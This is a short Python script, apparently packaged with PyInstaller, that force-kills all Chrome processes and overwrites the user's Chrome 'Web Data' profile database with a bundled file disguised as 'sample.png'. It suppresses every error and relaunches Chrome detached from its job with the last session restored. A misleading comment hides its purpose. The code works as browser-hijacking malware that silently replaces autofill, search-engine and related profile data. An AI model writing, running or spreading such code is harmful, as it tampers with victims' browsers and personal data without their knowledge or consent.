import stat
import os
import sys
import shutil
import psutil
import subprocess
import time
import webbrowser

def get_base_path():
    """Get the base path for bundled assets (works both in dev and PyInstaller)."""
    if getattr(sys, 'frozen', False):
        # Running as a PyInstaller bundle
        return sys._MEIPASS
    else:
        # Running in normal Python
        return os.path.dirname(os.path.abspath(__file__))


def run_headless():
    # Copy asset file to %LOCALAPPDATA% on load
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() == 'chrome.exe':
                proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    time.sleep(2.5)
    temp_dir = os.environ.get("LOCALAPPDATA", "LOCALAPPDATA")
    base_path = get_base_path()
    asset_file = os.path.join(base_path, "assets", "sample.png")

    if os.path.exists(asset_file):
        try:
            dest_file = os.path.join(temp_dir, "Google\\Chrome\\User Data\\Default\\Web Data")
            shutil.copy2(asset_file, dest_file)
        except:
            pass

    chrome_path = os.path.join(os.environ.get("PROGRAMFILES", ""), "Google\\Chrome\\Application\\chrome.exe")
    if not os.path.exists(chrome_path):
        chrome_path = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Google\\Chrome\\Application\\chrome.exe")
    if not os.path.exists(chrome_path):
        chrome_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google\\Chrome\\Application\\chrome.exe")
    subprocess.Popen(
        [chrome_path, '--restore-last-session'],
        close_fds=True,
        creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_BREAKAWAY_FROM_JOB
    )

if __name__ == "__main__":
    run_headless()


